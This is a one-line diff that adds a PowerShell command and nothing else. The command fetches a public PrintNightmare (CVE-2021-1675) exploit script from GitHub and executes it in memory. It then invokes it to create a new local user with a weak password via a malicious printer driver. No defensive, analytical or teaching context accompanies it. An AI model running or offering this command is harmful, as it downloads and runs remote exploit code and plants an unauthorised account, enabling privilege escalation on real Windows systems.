@@ -1,0 +1,1 @@
+iex(iwr https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1 -UseBasicParsing); Invoke-Nightmare -NewUser "User1" -NewPassword "password123" -DriverName "PrintMe" 
